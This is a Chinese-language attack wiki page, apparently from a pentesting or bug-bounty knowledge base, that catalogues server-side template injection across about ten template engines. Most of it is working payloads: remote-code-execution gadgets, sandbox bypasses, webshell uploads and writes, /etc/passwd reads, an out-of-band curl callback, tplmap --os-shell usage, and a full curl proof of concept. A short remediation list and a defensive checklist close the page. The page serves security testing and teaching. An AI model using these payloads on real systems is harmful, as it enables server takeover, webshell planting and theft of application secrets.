---
type: wiki
category: attack
tool: tplmap,manual
status: active
last-updated: 2026-04-21
---

# SSTI 深度攻擊（2026 版）

> **用途：** Server-Side Template Injection 是 P1 RCE。識別 template engine 後套對應 RCE gadget 就過關。本文把 8 種常見 engine 的 fingerprint、payload、sandbox 逃脫全列出。

## 0. 偵測流程

### 0.1 通用 fingerprint probe

```
{{7*7}}        → 49（Jinja2/Twig/Handlebars）/ 7*7（純文字 or mustache）
${7*7}         → 49（Freemarker/Velocity/Thymeleaf/JSP）
<%= 7*7 %>     → 49（ERB/EJS/JSP）
#{7*7}         → 49（Pug/Razor/Pug-like）
*{7*7}         → 49（Thymeleaf）
@{7*7}         → Angular (CSTI，不是 SSTI) / Razor
{7*7}          → 7*7 或 49（Angular / React interpolation）
```

### 0.2 Differential probe（細分 engine）

| Probe | Jinja2 | Twig | Freemarker | Velocity | ERB | EJS |
|-------|--------|------|------------|----------|-----|-----|
| `{{7*'7'}}` | `7777777` | `49` | ERROR | ERROR | - | - |
| `{{7*7}}` | `49` | `49` | - | - | - | - |
| `${7*7}` | - | - | `49` | `49` | - | - |
| `${"z".getClass()}` | - | - | `java.lang.String` | `class java.lang.String` | - | - |
| `{{self}}` | `<Context ...>` | `Twig\Template_...` | - | - | - | - |
| `<%= 7*7 %>` | - | - | - | - | `49` | `49` |
| `<%= __proto__ %>` | - | - | - | - | - | EJS-specific |

### 0.3 自動化

```bash
# tplmap
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt
python2 tplmap.py -u 'https://target.com/page?name=test*'

# --os-shell 給 interactive shell
python2 tplmap.py -u '...' --os-shell
```

## 1. Jinja2 (Python / Flask / Django)

### 1.1 環境 enum

```
{{ config }}                              → Flask config
{{ config.items() }}
{{ self }}
{{ self._TemplateReference__context }}
{{ request.application.__globals__ }}
```

### 1.2 RCE（classic）

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# → [<class 'type'>, <class 'weakref'>, ..., <class 'object'>, ...]
# 找 index of subprocess.Popen

{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

### 1.3 RCE（short form 2026 版）

```python
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}

# Flask 特別簡潔
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 1.4 Sandbox bypass

Jinja2 有 `SandboxedEnvironment`：

```python
# 繞 attr block
{{ ''|attr('__class__') }}
{{ ''['__class__'] }}

# 繞 keyword filter
{{ ''[request.args.x] }}    # URL: ?x=__class__
```

## 2. Twig (PHP / Symfony / Drupal 8+)

### 2.1 Fingerprint

```
{{ 7*'7' }} → 49（Twig，不像 Jinja2 回字串）
{{ _self }} → Twig\Template_...
{{ dump() }} → Twig 環境 dump
```

### 2.2 RCE

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ _self.env.setCache("ftp://attacker:...")}}

{# Twig 2.x+ 禁用 _self.env，改用 filter #}
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|map('system')|join(' ') }}
```

### 2.3 Symfony 沒 sandbox 的情況

```twig
{{ app.request.files.get('x').move('/var/www/html','s.php') }}
# 上傳 webshell via SSTI
```

## 3. Freemarker (Java / Spring / Liferay)

### 3.1 Fingerprint

```
${7*7} → 49
${"z".getClass()} → class java.lang.String
```

### 3.2 RCE

```
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}

${"freemarker.template.utility.Execute"?new()("id")}

<#assign cl="freemarker.template.utility.ObjectConstructor"?new()>
${cl("java.lang.ProcessBuilder","id").start().getInputStream()}
```

### 3.3 Sandbox bypass（StaticModels）

```
${objectConstructor("freemarker.template.utility.Execute").exec(["id"])}
```

## 4. Velocity (Apache / older Spring)

### 4.1 Fingerprint

```
${7*7} → 49 (less common)
#set($x = 7*7)${x} → 49
```

### 4.2 RCE

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

短版：

```
#set($x=[])
#set($cmd="id")
#set($rt=$x.class.forName("java.lang.Runtime").getRuntime())
$rt.exec($cmd).inputStream.readLines()
```

## 5. Thymeleaf (Spring Boot 常用)

### 5.1 Fingerprint

```
${7*7}   → 49
*{7*7}   → 49
#{7*7}   → 7*7（字串）
@{7*7}   → URL context
```

### 5.2 RCE（若有 preprocessing `__${}__`）

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# 或 inline
[[${T(Runtime).getRuntime().exec("id")}]]
```

### 5.3 CVE-2023-38286 型（Spring + Thymeleaf）

若 `ServletException` handler 把使用者 input 變 view name：

```
GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()}__::.x
```

## 6. ERB (Ruby / Rails)

### 6.1 Fingerprint

```
<%= 7*7 %> → 49
```

### 6.2 RCE

```erb
<%= `id` %>                    # 反引號執行
<%= `id`.inspect %>
<%= system('id') %>            # 執行但只回 true/false
<%= IO.popen('id').read() %>

<%= require('open3'); Open3.capture2('id') %>
```

### 6.3 Rails 特有

```erb
<%= render inline: "<%= `id` %>" %>
<%= render file: "/etc/passwd" %>        # LFI
```

## 7. EJS (Node.js)

### 7.1 Fingerprint

```
<%= 7*7 %> → 49
<%- 7*7 %> → 49 (unescaped)
```

### 7.2 RCE

```ejs
<%- global.process.mainModule.require('child_process').execSync('id') %>

<%- require('child_process').execSync('id') %>

# Template compile injection（CVE-2022-29078）
{"settings":{"view options":{"outputFunctionName":"x;global.process.mainModule.require('child_process').execSync('id');x"}}}
```

### 7.3 Pug / Jade

```pug
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
p= x

#{process.mainModule.require('child_process').execSync('id')}
```

## 8. Handlebars / Mustache

### 8.1 Fingerprint

```
{{7*7}} → 7*7（不執行）— Handlebars 默認不算
```

### 8.2 Handlebars (Node.js) — 若 helper 不安全

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 9. Smarty (PHP)

### 9.1 Fingerprint

```
{$smarty.version} → Smarty 版本
```

### 9.2 RCE

```smarty
{php}system('id');{/php}    # Smarty 2.x / 3.x (php tag)

# Smarty 3+ 禁用 {php}，用：
{system('id')}                # Smarty Lite
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}
```

## 10. Blind SSTI

若 response 不 reflect：

```python
# Jinja2 時間盲測
{{ ''.join(['a' for _ in range(10000000)]) }}  # 耗 CPU
{{ sleep(5) }}                                   # 若 sleep 被注
```

OOB：

```python
{{ lipsum.__globals__['os'].popen('curl http://oast/').read() }}
```

## 11. 工具

### 11.1 tplmap（主要）

```bash
git clone https://github.com/epinna/tplmap
python2 tplmap.py -u 'https://target.com/?name=*'

# Engine-specific
python2 tplmap.py -u '...' -e jinja2,twig,freemarker
```

### 11.2 Burp extensions

- Tplmap extension
- Backslash Powered Scanner（自動找 SSTI）

### 11.3 Nuclei SSTI templates

```bash
nuclei -u https://target.com -tags ssti,rce
```

## 12. 完整 PoC：Jinja2 → RCE

### Step 1: Fingerprint

```bash
curl "https://target.com/greet?name={{7*7}}"
# Response 含 "Hello 49" → SSTI

curl "https://target.com/greet?name={{7*'7'}}"
# Response "Hello 7777777" → Jinja2
```

### Step 2: Environment enum

```bash
curl "https://target.com/greet?name={{self}}"
# "<Context 0x7f...>"
```

### Step 3: RCE

```bash
curl -G "https://target.com/greet" \
  --data-urlencode "name={{ lipsum.__globals__['os'].popen('id').read() }}"
# "Hello uid=33(www-data) gid=33(www-data)"
```

### Step 4: 報告

```markdown
## 漏洞概述
https://target.com/greet?name= 直接把 user input 餵進 Jinja2 render()，
未做 sandboxing。攻擊者可透過 `{{ lipsum.__globals__['os'].popen('id').read() }}`
達成 pre-auth RCE。

## PoC
[3 curl]

## Impact
- Pre-auth remote code execution (user: www-data)
- 完整 server 控制，含讀取 /etc/passwd, app secrets, DB credentials

## Severity
P1 / Critical

## 修補
1. 絕不 render_template_string(user_input)
2. 若必須動態 template，用 sandboxed env + 白單 variables
3. User input 永遠作 context 傳入 ({{ name }}) 而非作 template string
4. WAF filter {{ / ${ / <%= 組合字元
```

## 13. 防禦 checklist

```
1. 絕不把 user input 作為 template string render
2. User input 只能作 variable substitution（{{ name }} where name=user_input）
3. 若需要 allow template，用 sandboxed environment
4. Jinja2: SandboxedEnvironment + 白單 globals
5. Twig: sandbox() + 明確 policies
6. Thymeleaf: 禁用 preprocessing `__${}__`
7. Freemarker: 啟用 new_builtin_class_resolver 白單
8. WAF pattern：過濾 {{, ${, <%=, #{ 組合（誤殺率高，輔助用）
9. CSP 無法擋 SSTI（是 server-side）
```

## 關聯文件

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSTI polyglot
- [67-deserialization.md](67-deserialization.md) — Java / Ruby / Node 延伸到 deserialize
- [74-command-injection.md](74-command-injection.md) — SSTI 觸發 system() 的完整 cmdinj
- PortSwigger SSTI：https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings SSTI：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- tplmap：https://github.com/epinna/tplmap
